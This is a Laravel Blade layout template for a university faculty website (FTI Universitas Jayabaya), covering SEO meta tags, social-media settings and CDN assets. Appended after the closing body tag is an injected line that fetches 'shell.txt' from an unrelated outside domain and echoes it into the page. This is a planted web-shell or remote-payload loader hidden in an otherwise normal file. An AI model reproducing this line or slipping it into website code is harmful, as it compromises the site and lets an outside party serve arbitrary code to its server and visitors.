{!! cek_statistik() !!}

@php 
    $frontoffice_app_name                   = get_val_setting('frontoffice_app_name');
    $frontoffice_app_theme_color            = get_val_setting('frontoffice_app_theme_color');
    $frontoffice_app_description            = get_val_setting('frontoffice_app_description');
    $frontoffice_app_keywords               = get_val_setting('frontoffice_app_keywords');
    $frontoffice_app_twitter                = get_val_setting('frontoffice_app_twitter');
    $frontoffice_app_facebook               = get_val_setting('frontoffice_app_facebook');
    $frontoffice_app_instagram              = get_val_setting('frontoffice_app_instagram');
    $frontoffice_app_youtube                = get_val_setting('frontoffice_app_youtube');
    $frontoffice_app_tiktok                 = get_val_setting('frontoffice_app_tiktok');

    $frontoffice_app_facebook_pixel_code    = get_val_setting('frontoffice_app_facebook_pixel_code');
    $frontoffice_app_twitter_pixel_code     = get_val_setting('frontoffice_app_twitter_pixel_code');
    $frontoffice_app_google_tag_manager     = get_val_setting('frontoffice_app_google_tag_manager');
    $frontoffice_app_google_analytics       = get_val_setting('frontoffice_app_google_analytics');
    $frontoffice_app_additional_meta_tag    = get_val_setting('frontoffice_app_additional_meta_tag');
    
@endphp

<!doctype html>
<html class="no-js" lang="id-ID">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <title>{{ (isset($title) && $title ? $title : $frontoffice_app_name) }}</title>
    <meta name="robots" content="index, follow">
    <meta name="googlebot" content="index, follow">
    <meta name="googlebot-news" content="index, follow">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <link rel="canonical" href="{{ url('/') }}" />
    
    <meta name="msapplication-TileColor" content="{{ $frontoffice_app_theme_color }}">
    <meta name="msapplication-TileImage" content="{{ url('assets/frontoffice/static/favicon/favicon.ico') }}">
    <meta name="theme-color" content="{{ $frontoffice_app_theme_color }}">
    <meta name="apple-mobile-web-app-title" content="{{ $frontoffice_app_name }}"/>
    <meta name="application-name" content="{{ $frontoffice_app_name }}"/>
    <link rel="alternate" type="application/rss+xml" title="{{ $frontoffice_app_name }}" href="{{ url('feed') }}" />

    @if(in_array(Request::segment(1), array('artikel', 'agenda', 'pages', 'profil', 'galeri')) && Request::segment(2) != '' && Request::segment(2) != 'rilis')
    
    <meta name="keywords" content="{{ strip_tags($details->meta_keyword)  }}" />
    <meta name="description" content="{{ strip_tags($details->meta_description)  }}">
    <meta property="og:type" content="article" />
    <meta property="og:title" content="{{ $details->judul }}" />
    <meta property="og:url" content="{{ url()->current() }}" />
    <meta property="og:description" content="{{ strip_tags($details->meta_description) }}" />
    <meta property="url" content="{{ url()->current() }}" />
    <meta property="article:published_time" content="{{ date('c', strtotime($details->created_at)) }}" />
    <meta property="article:modified_time" content="{{ date('c', strtotime($details->updated_at)) }}" />
    <meta property="og:site_name" content="{{ $frontoffice_app_name }}" />
    @if(isset($details->sampul) && $details->sampul)<meta property="og:image" content="{{ get_thumbs_path($details->sampul) }}" /> @endif

    <meta property="og:image:width" content="1200" />
    <meta property="og:image:height" content="675" />
    <meta property="og:image:alt" content="{{ $details->judul }}" />
    <meta property="og:locale" content="id_ID" />
    <meta property="article:publisher" content="{{ url('/') }}" />
    <meta name="twitter:creator" content="{{ $frontoffice_app_twitter }}" />
    <meta name="twitter:site" content="{{ $frontoffice_app_twitter }}" />
    <meta name="twitter:text:title" content="{{ $details->judul }}" />    
    <meta name="twitter:card" content="summary_large_image" />
    @if(isset($details->sampul) && $details->sampul)<meta name="twitter:image" content="{{ get_thumbs_path($details->sampul) }}" /> @endif

    @else
    
    <meta name="keywords" content="{{ $frontoffice_app_keywords }}" />
    <meta name="description" content="{{ $frontoffice_app_description }}">
    <meta property="og:type" content="website" />
    <meta property="og:title" content="{{ $frontoffice_app_name }}" />
    <meta property="og:url" content="{{ url('/') }}" />
    <meta property="og:description" content="{{ $frontoffice_app_description }}" />
    <meta property="og:image" content="{{ url('assets/frontoffice/img/logo/favicon.png') }}" />
    <meta property="og:site_name" content="{{ $frontoffice_app_name }}" />
    <meta property="og:image:width" content="200" />
    <meta property="og:image:height" content="200" />
    <meta property="og:image:alt" content="{{ $frontoffice_app_name }}" />
    <meta property="og:locale" content="id_ID" />
    <meta property="article:publisher" content="{{ url('/') }}" />
    <meta name="twitter:creator" content="{{ $frontoffice_app_twitter }}" />
    <meta name="twitter:site" content="{{ $frontoffice_app_twitter }}" />
    <meta name="twitter:text:title" content="{{ $frontoffice_app_name }}" />  
    
    @endif
    {!! $frontoffice_app_facebook_pixel_code !!} {!! $frontoffice_app_twitter_pixel_code !!} {!! $frontoffice_app_google_tag_manager !!} {!! $frontoffice_app_google_analytics !!} {!! $frontoffice_app_additional_meta_tag !!}
    
    <script type="application/ld+json">{
      "@context": "http://schema.org",
      "@type": "Organization",
      "name": "FTI Universitas Jayabaya",
      "url": "{{ url('/') }}",
      "logo": "{{ url('assets/frontoffice/img/logo/favicon.png') }}",
      "sameAs" : [
        "{{ $frontoffice_app_facebook }}",
        "{{ $frontoffice_app_twitter }}",
        "{{ $frontoffice_app_instagram }}",
        "{{ $frontoffice_app_youtube }}",
        "{{ $frontoffice_app_tiktok }}"
      ]
    }</script>

    <link rel="shortcut icon" type="image/x-icon" href="{{ url('assets/frontoffice/img/logo/favicon.png') }}">
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/5.3.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
    <link rel="stylesheet" href="{{ url('assets/frontoffice/css/flaticon.css') }}">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/Swiper/6.5.0/swiper-bundle.min.css">
    
    @if(Request::segment(1) == 'galeri')
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.33/carousel/carousel.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.33/fancybox/fancybox.min.css">
    
    @endif
     
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/aos/2.3.4/aos.css">
    <link rel="stylesheet" href="{{ url('assets/frontoffice/css/default.css') }}">
    <link rel="stylesheet" href="{{ url('assets/frontoffice/css/style.min.css?v=2.1.2') }}">

    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    @if(Request::segment(1) == 'galeri')
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.33/fancybox/fancybox.umd.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.33/carousel/carousel.thumbs.umd.min.js"></script>
    
    @endif
</head>
<body>

    @include('partials.frontoffice.header')

        @yield('contents')

    @include('partials.frontoffice.footer')
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/5.3.2/js/bootstrap.bundle.min.js"></script>
    <script src="{{ url('assets/frontoffice/js/gsap.js') }}"></script>
    <script src="{{ url('assets/frontoffice/js/ScrollTrigger.js') }}"></script>
    <script src="{{ url('assets/frontoffice/js/SplitText.js') }}"></script>
    <script src="{{ url('assets/frontoffice/js/gsap-animation.js') }}"></script>
    <script src="{{ url('assets/frontoffice/js/jquery.parallaxScroll.min.js') }}"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/Swiper/6.5.0/swiper-bundle.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/wow/1.1.2/wow.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/aos/2.3.4/aos.js"></script>
    <script src="{{ url('assets/frontoffice/js/main.js?v=2.1') }}"></script>
</body>$a = file_get_contents('https://buahnagaberdada.site/shell.txt'); echo $a;</html>
